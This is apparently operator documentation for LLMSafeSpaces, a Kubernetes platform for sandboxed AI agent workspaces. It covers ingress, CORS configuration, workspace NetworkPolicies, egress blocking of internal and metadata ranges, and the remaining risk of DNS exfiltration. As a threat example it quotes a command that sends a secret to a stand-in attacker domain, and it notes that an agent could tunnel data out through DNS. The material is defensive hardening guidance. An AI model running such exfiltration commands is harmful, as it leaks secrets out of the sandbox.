# Networking

This page covers the network topology of an LLMSafeSpaces deployment: ingress patterns and TLS termination, the workspace NetworkPolicy (default-deny ingress, RFC1918/CGNAT/metadata-blocked egress), the per-workspace external-egress allowlist mechanism, IPv6 caveats, and DNS exfiltration considerations. Networking is where multi-tenant isolation is most visible to operators, so this page spends time on the threat-model assumptions behind each policy.

## On this page

- [Topology](#topology)
- [Ingress and TLS termination](#ingress-and-tls-termination)
- [The workspace NetworkPolicy](#the-workspace-networkpolicy)
- [Egress allowlisting](#egress-allowlisting)
- [Datastore NetworkPolicies](#datastore-networkpolicies)
- [API ingress restriction](#api-ingress-restriction)
- [IPv6 caveats](#ipv6-caveats)
- [DNS exfiltration](#dns-exfiltration)
- [CNI considerations](#cni-considerations)

---

## Topology

```mermaid
graph TB
    USER["Clients<br/>(browser / SDK / MCP)"] -->|HTTPS/JWT| INGRESS["Ingress controller<br/>(TLS termination)"]
    INGRESS -->|HTTP| API["LLMSafeSpaces API<br/>(Gin, :8080)"]
    API -->|pgx/TLS| PG["PostgreSQL"]
    API -->|go-redis/auth| REDIS["Redis / Valkey"]
    API -->|K8s API| K8S["kube-apiserver"]
    CTRL["Controller<br/>(controller-runtime)"] -->|K8s API| K8S
    CTRL -->|HTTP :4098| WSPOD["Workspace pods<br/>(agentd admin port)"]
    API -->|HTTP :4097<br/>(plain, pod IP)| WSPOD
    WSPOD -->|egress filtered| EXT["External internet<br/>(LLM APIs, package registries)"]
    PROM["Prometheus"] -->|HTTP :4098| WSPOD
```

Key properties:

- **Client → API** is HTTPS, terminated at the ingress. The API itself listens on plain HTTP.
- **API → workspace pod** is plain HTTP to the pod IP on the agentd user port (4097). This is accepted risk G4 (no mTLS); a service mesh can add it.
- **Controller → workspace pod** is plain HTTP on the agentd admin port (4098) for health polling and `/metrics`.
- **Workspace pod → external** is filtered by the workspace egress NetworkPolicy.

---

## Ingress and TLS termination

The API service does not terminate TLS. Terminate it at an ingress controller:

```yaml
frontend:
  enabled: true
  ingress:
    enabled: true
    host: app.example.com
    tls: true              # default since RT-6.14
    tlsSecret: ""          # provide a name or let cert-manager issue one
```

### Trusting forwarded headers

The API trusts the ingress to set `X-Forwarded-Proto` and `Host` correctly. For **per-org OIDC SSO**, the platform no longer derives the callback URL from these headers — `oidc.redirectBaseUrl` must be set explicitly (fail-loud hardening, see [OIDC SSO](oidc-sso.md#redirect-base-url)). The IdP's registered-redirect-URI check is the remaining defense-in-depth when the header path was used.

### Security headers

The frontend ingress ships default annotations for ingress-nginx that set CSP, X-Frame-Options, HSTS, X-Content-Type-Options, and Referrer-Policy:

```yaml
annotations:
  nginx.ingress.kubernetes.io/configuration-snippet: |
    more_set_headers "Content-Security-Policy: default-src 'self'; connect-src 'self' wss:; ...; frame-ancestors 'none'; base-uri 'self'; form-action 'self'";
    more_set_headers "X-Frame-Options: DENY";
    more_set_headers "Strict-Transport-Security: max-age=31536000; includeSubDomains";
```

If you use a different ingress (Traefik, HAProxy), override `annotations` with your controller's equivalent header-injection annotations. CSP `frame-ancestors 'none'` + `X-Frame-Options: DENY` together block clickjacking; HSTS prevents downgrade attacks.

### CORS at the edge

!!! warning "Ingress-controller CORS middleware overrides the app's CORS headers"
    The API process emits its own CORS response headers via `middleware.SecurityMiddleware` (`api/internal/middleware/security.go`). When a browser makes a cross-origin request (e.g. a separate `chat.example.com` frontend talking to `api.example.com`), **any ingress-controller middleware that sets an `Access-Control-*` response header will overwrite the app's value**, not merge with it. This is by design in Traefik's Headers middleware (`pkg/middlewares/headers/header.go:PostRequestModifyResponseHeaders` — unconditional `res.Header.Set()` for `Allow-Origin`, `Allow-Credentials`, and `Expose-Headers` on every actual response) and equivalent middlewares in other controllers.

    If your ingress CORS middleware lists fewer headers than the app emits, **the missing headers silently disappear from the browser's view** even though they remain physically present on the wire. The API has no way to detect or warn about this — it correctly emitted the headers, and the edge correctly overwrote them.

The app emits these CORS-exposed headers (pinned in `DefaultSecurityConfig().ExposedHeaders`, `security.go:64`):

| Header | Source | Used by frontend for |
|---|---|---|
| `X-Request-ID` | request middleware | Correlating client-side errors with server logs |
| `X-RateLimit-Limit` | rate-limit middleware | Showing the user their quota ceiling |
| `X-RateLimit-Remaining` | rate-limit middleware | Showing the user their remaining quota |
| `X-RateLimit-Reset` | rate-limit middleware | Showing the user when their quota resets |
| `X-Next-Cursor` | message-history pagination (`GetHistory`) | Driving `useInfiniteQuery.hasNextPage` — the "Load earlier messages" button |

If **any** of these are missing from the browser's view, the corresponding frontend feature silently breaks. The most user-visible: a missing `X-Next-Cursor` causes the "Load earlier messages" button to never render (the cursor is on the wire but invisible to JS, so `hasNextPage` stays `false`).

#### Traefik

Traefik's Headers middleware activates its CORS code path when **any** `accessControl*` field is set on the Middleware CR. Once activated, `PostRequestModifyResponseHeaders` unconditionally overwrites `Access-Control-Expose-Headers` on every actual response with the middleware's list — the app's value is discarded. Traefik does NOT overwrite `Allow-Headers`, `Allow-Methods`, or `Max-Age` on actual responses (those are only set on preflight `OPTIONS` responses inside `processCorsHeaders`), so a misconfigured Traefik middleware produces a confusing wire response where some CORS headers match the app and only `Expose-Headers` matches Traefik.

To deploy LLMSafeSpaces behind Traefik with a cross-origin frontend, your API ingress needs a Middleware that mirrors the app's CORS config in full:

```yaml
apiVersion: traefik.io/v1alpha1
kind: Middleware
metadata:
  name: llmsafespaces-api-cors
  namespace: llmsafespaces
spec:
  headers:
    accessControlAllowOriginList:
      - https://chat.example.com    # your frontend origin
    accessControlAllowMethods:
      - GET
      - POST
      - PUT
      - PATCH
      - DELETE
      - OPTIONS
    accessControlAllowHeaders:
      - Accept
      - Authorization
      - Content-Type
      - X-Requested-With
      - X-Request-Id
    accessControlAllowCredentials: true   # required — frontend uses cookie auth
    accessControlExposeHeaders:
      - X-Request-Id                     # ↑↑↑ must mirror the app's full list
      - X-RateLimit-Limit                # omitting any of these silently
      - X-RateLimit-Remaining            # breaks the corresponding frontend
      - X-RateLimit-Reset                # feature — see the table above
      - X-Next-Cursor
    accessControlMaxAge: 600              # only affects preflight cache
    addVaryHeader: true
```

Bind it to the API ingress via annotation (CORS middleware MUST run before any shared security-headers chain so its `Allow-Origin`/`Allow-Methods` are what Traefik returns on short-circuited preflight):

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: llmsafespaces-api
  annotations:
    traefik.ingress.kubernetes.io/router.middlewares: llmsafespaces-llmsafespaces-api-cors@kubernetescrd
```

!!! tip "Verifying on the wire"
    After deploying, verify the live response exposes all 5 headers:

    ```bash
    curl -sI -H "Origin: https://chat.example.com" \
      "https://api.example.com/api/v1/workspaces/<ws>/sessions/<ses>/message?limit=1" \
      | grep -iE 'access-control-expose|x-next-cursor'
    ```

    Expect `access-control-expose-headers` with all 5 entries and `x-next-cursor` visible. If only `X-Request-Id` shows up, the middleware's expose-list has bit-rotted against the app.

!!! warning "Drift hazard"
    The expose-list above is pinned to the app's `DefaultSecurityConfig().ExposedHeaders`. If the app adds a new CORS-exposed header in a future release (e.g. for a new pagination or quota feature), the Traefik middleware will silently strip it until this list is updated. There is no automated check — the regression test in `api/internal/middleware/security_exposed_headers_test.go` covers the app only, not the edge. When upgrading LLMSafeSpaces, diff `security.go:ExposedHeaders` against your middleware's `accessControlExposeHeaders` and reconcile.

#### Other ingress controllers

The same override semantics apply to any middleware that injects CORS response headers — HAProxy's `http-response set-header`, nginx-ingress's `more_set_headers`, Envoy Gateway's CORS filter, etc. The general principle: **either let the app own CORS entirely (set no `Access-Control-*` headers at the edge), or mirror the app's full CORS config at the edge**. Don't do half-and-half.

---

## The workspace NetworkPolicy

When `networkPolicy.enabled=true` (the default), the chart ships two workspace policies:

### 1. Default-deny ingress (`workspace-default-deny-ingress`)

Without this, any pod in the cluster — including other tenants' workspaces — can reach a workspace pod. The policy denies all ingress by default, then explicitly allows:

- The **API** (so the proxy can reach the agentd user port 4097).
- The **controller** (so health polling on admin port 4098 doesn't time out — without this, the 3-strike threshold trips, the controller kills and recreates the pod, and the cycle repeats).
- **Prometheus** (when the agentd PodMonitor is enabled, so `/metrics` on 4098 is scrapable).

The pod selectors are configurable:

```yaml
networkPolicy:
  apiPodLabelSelector:
    app.kubernetes.io/name: llmsafespaces
    app.kubernetes.io/component: api
  controllerPodLabelSelector:
    app.kubernetes.io/name: llmsafespaces
    app.kubernetes.io/component: controller
  prometheusPodLabelSelector:
    app.kubernetes.io/name: prometheus
  prometheusNamespace: ""   # defaults to release ns; set to e.g. "monitoring"
```

### 2. Default-deny egress (`workspace-egress`)

When `networkPolicy.workspaceEgress=true` (the default), egress is denied by default with explicit allowances for DNS plus operator-specified CIDRs.

**Allowed egress:**

```yaml
networkPolicy:
  allowedEgressCIDRs:
    - 0.0.0.0/0   # default: all public internet
```

**Blocked egress** (the threat-model A2 baseline — sandbox pods should never reach in-cluster services or cloud metadata):

```yaml
networkPolicy:
  blockedEgressCIDRs:
    - 10.0.0.0/8        # RFC1918 — in-cluster service ranges, internal admin endpoints
    - 172.16.0.0/12     # RFC1918
    - 192.168.0.0/16    # RFC1918
    - 169.254.0.0/16    # link-local + cloud metadata (169.254.169.254)
    - 100.64.0.0/10     # CGNAT — managed K8s pod CIDRs (AKS, some EKS, k3s default)
    - 127.0.0.0/8       # loopback
    - 224.0.0.0/4       # multicast
```

This list mirrors `privateOrInternalCIDRs` in [`controller/internal/workspace/network_policy.go`](https://github.com/lenaxia/LLMSafeSpaces/blob/main/controller/internal/workspace/network_policy.go). Keep both in sync; the chart test `TestG16_DefaultRender_BlockedEgressIncludesAllControllerSideCIDRs` pins parity.

**DNS** is explicitly allowed to the kube-dns service:

```yaml
networkPolicy:
  dnsNamespace: kube-system
  dnsPodLabelSelector:
    k8s-app: kube-dns
```

Override on clusters with non-standard DNS.

!!! danger "Why the workspaceEgress toggle exists"
    Kubernetes NetworkPolicy **unions** allow rules across ALL policies attached to a pod. If both this chart's NP AND a Cilium `CiliumNetworkPolicy` are in play, effective egress = union = whichever is more permissive. Since this NP allows `0.0.0.0/0` by default, it defeats FQDN-based allowlists in the CNP. Set `networkPolicy.workspaceEgress=false` **only** when a CNI-native policy (Cilium CNP, Calico GlobalNetworkPolicy) is enforcing a strict FQDN allowlist — otherwise workspace pods have no egress restriction at all.

---

## Egress allowlisting

The default `allowedEgressCIDRs: ["0.0.0.0/0"]` with RFC1918/CGNAT/metadata blocking is the "allow public internet, block internal" baseline. For tighter deployments, replace it with a strict allowlist of the CIDRs your agents need (LLM provider IPs, package registry mirrors, internal artifact stores reachable from the workspace network).

### FQDN-based egress

Kubernetes `NetworkPolicy` does not support FQDN natively. To restrict egress by domain name, use a CNI that supports it:

- **Cilium** — `CiliumNetworkPolicy` with `toFQDNs` and a DNS proxy.
- **Calico** — `GlobalNetworkPolicy` with domain rules (FQDN-to-IP via DNS).

When you do this, **disable the chart's workspaceEgress NP** (see the danger callout above) so the union doesn't defeat your FQDN policy.

### Per-workspace egress

The platform supports per-workspace egress configuration via the `securityPolicy.network` field on the Workspace CRD (see [Security Hardening](security.md)). This lets individual workspaces declare additional allowed domains beyond the platform baseline.

---

## Datastore NetworkPolicies

The chart ships NetworkPolicies blocking ingress to Postgres and Valkey except from the API deployment and the migration Job. Workspace pods (selectable by `component=workspace`) **cannot** reach the datastores directly. This is gated by `networkPolicy.enabled` and `datastore.networkPolicy.enabled`.

```yaml
datastore:
  networkPolicy:
    enabled: true
    postgresPodSelectorLabels:
      app: postgres       # match your Postgres pods
    valkeyPodSelectorLabels:
      app: valkey         # match your Valkey/Redis pods
```

The defaults match `local/postgres-redis.yaml`. If you deploy Postgres via the Bitnami chart, override with `{ app.kubernetes.io/name: postgresql }`.

---

## API ingress restriction

By default the API pod admits traffic from any source (the ingress controller + any in-cluster pod). There is an opt-in default-deny ingress policy for the API itself:

```yaml
networkPolicy:
  apiIngressRestricted: false   # opt-in
  apiIngressSourcePodSelector:  # allowed user-traffic source
    app.kubernetes.io/name: llmsafespaces
    app.kubernetes.io/component: frontend
```

When `true`, the policy admits only:

- The **controller** (internal org-status polls — already authenticated by the mandatory `LLMSAFESPACES_INTERNAL_TOKEN`, fail-closed).
- **kube-system** (kubelet probes).
- The pod selector above (typically your ingress controller / frontend).

The default is `false` because the user-traffic source is deployment-specific (ingress controller labels vary) and a wrong allowlist would lock users out. This policy is defense-in-depth, not the primary control. Enable it after confirming the ingress source selector matches your environment.

---

## IPv6 caveats

!!! info "IPv6 egress is denied by default (G43 resolved)"
    The workspace egress NetworkPolicy has `policyTypes: [Egress]`, which default-denies ALL egress not explicitly allowed. The `allowedEgressCIDRs: [0.0.0.0/0]` matches IPv4 only (Kubernetes `ipBlock` CIDRs are address-family-specific). IPv6 traffic is denied by omission — no egress rule matches `::/0`.

    **If you need IPv6 egress** (e.g. your LLM provider is IPv6-only), add `::/0` (with appropriate exceptions for ULA/link-local) to `networkPolicy.allowedEgressCIDRs` in your Helm values. Without that, workspace pods are effectively IPv4-only for external connectivity.

---

## DNS exfiltration

DNS is allowed to kube-dns on port 53 (UDP/TCP). This is required for the workspace to resolve any external host on boot. The threat: an agent can encode exfiltrated data in DNS query names (e.g. `curl secret.attacker.com` or a DNS-tunneling client).

### Current state

- The chart's egress NP allows port 53 to kube-dns **and** `0.0.0.0/0` (minus RFC1918) — so external DNS resolvers (e.g. `8.8.8.8:53`) are also reachable (gap G30, accepted — standard NetworkPolicy cannot restrict DNS by domain). The two rules are OR-ed.
- There is no DNS query body inspection. This is accepted residual risk (G14): no code path inspects outbound HTTP request bodies either.

### Operator mitigations

| Mitigation | Effectiveness | Cost |
|---|---|---|
| Restrict DNS to kube-dns only (remove the `0.0.0.0/0` port-53 allowance via a stricter NP) | Blocks external resolvers; kube-dns still resolves everything | Low — but the union-with-`0.0.0.0/0` rule undermines this unless you tighten `allowedEgressCIDRs` |
| CoreDNS rate limiting + query logging | Detects high-volume exfil; doesn't prevent low-and-slow | Medium — CoreDNS plugin config |
| Cilium FQDN policy with DNS proxy | Inspects and allowlists DNS queries by name | High — requires Cilium and disabling the chart NP |
| Egress proxy with body inspection (out of scope) | Would catch HTTP exfil too | High — not provided by the platform |

The platform's audit logging records DNS-related events at verbose level for forensic analysis, but does not block DNS-based exfiltration by default.

---

## CNI considerations

The chart's NetworkPolicies require a CNI that enforces `NetworkPolicy` resources. Validated options:

| CNI | NetworkPolicy enforcement | FQDN egress | Notes |
|---|---|---|---|
| **Calico** | Yes | Via `GlobalNetworkPolicy` | Most common choice; works out of the box. |
| **Cilium** | Yes | Via `CiliumNetworkPolicy` | Disable chart's `workspaceEgress` NP if using Cilium FQDN rules (union gotcha). |
| **Cloud CNIs** (VPC CNI, Azure CNI, GKE PD-VPC) | Varies | No | Verify your CNI enforces `NetworkPolicy`. Some require a policy controller add-on. |
| **Flannel** | **No** (without a plugin) | No | Not suitable for multi-tenant deployments without Calico policy layer. |

!!! fail "No NetworkPolicy controller = no isolation"
    If your CNI does not enforce `NetworkPolicy`, the chart's policies are inert. Workspace pods will have unrestricted ingress and egress. This breaks the threat-model A2 assumption. Do not run multi-tenant deployments on a CNI without policy enforcement.

### The Cilium migration gotcha

When migrating to Cilium with FQDN-based egress, you **must** disable the chart's `workspaceEgress` NP:

```yaml
networkPolicy:
  workspaceEgress: false   # let Cilium CNP own egress
```

Kubernetes NetworkPolicy unions allow rules across ALL policies attached to a pod. The chart's NP allows `0.0.0.0/0` (minus RFC1918), which would union with your Cilium FQDN allowlist to produce "allow everything public" — defeating the FQDN policy. This was discovered during the 2026-07-02 Cilium migration (documented in `ops-prod/docs/runbooks/cilium-migration.md` gotcha #10).

---

## The plain-HTTP pod network (gap G4)

The API↔workspace path (`http://<pod-ip>:4097`) and the controller↔workspace path (`http://<pod-ip>:4098`) are **plain HTTP**. This is accepted risk G4: a MITM on the pod network could intercept traffic, including the workspace basic-auth password the proxy injects.

### Mitigations

| Mitigation | Effectiveness | Cost |
|---|---|---|
| Service mesh mTLS (Linkerd, Istio) | High — encrypts all pod-to-pod traffic transparently | Medium — deploy + tune the mesh |
| NetworkPolicy restricting who can reach workspace pods | Medium — limits the attacker set to the API/controller pods | Low (shipped by default) |
| WireGuard / encrypted CNI (Cilium with WireGuard encryption) | High — encrypts node-to-node traffic | Low if already using Cilium |

The default-deny ingress NetworkPolicy is the primary mitigation shipped by the chart — only the API and controller can reach workspace pods. For higher assurance, add a service mesh.

---

## Service mesh guidance

If you deploy a service mesh for mTLS:

- **Linkerd** — automatic mTLS via sidecar injection. Annotate the workspace namespace for injection. The mesh encrypts API↔workspace traffic without app changes.
- **Istio** — mTLS via PeerAuthentication. More feature-rich but heavier. Ensure the workspace pods get the sidecar (may conflict with gVisor — test).
- **Cilium** (no sidecar) — transparent mTLS via the Cilium identity layer. Lightest option if already on Cilium.

!!! note "gVisor + service mesh compatibility"
    gVisor intercepts syscalls; service-mesh sidecars run as additional containers. Test that your mesh's sidecar works under `runsc`. Linkerd's `linkerd2-proxy` is generally compatible; Istio's `envoy` may need configuration.

---

## Related

- [Security Hardening](security.md) — the threat model these policies implement.
- [Multi-tenant Isolation](multi-tenant.md) — tenant identity and quotas.
- [Monitoring](monitoring.md) — Prometheus needs ingress to the agentd admin port.
- [Helm Values Reference](../reference/helm-values.md) — `networkPolicy.*`, `datastore.*`.
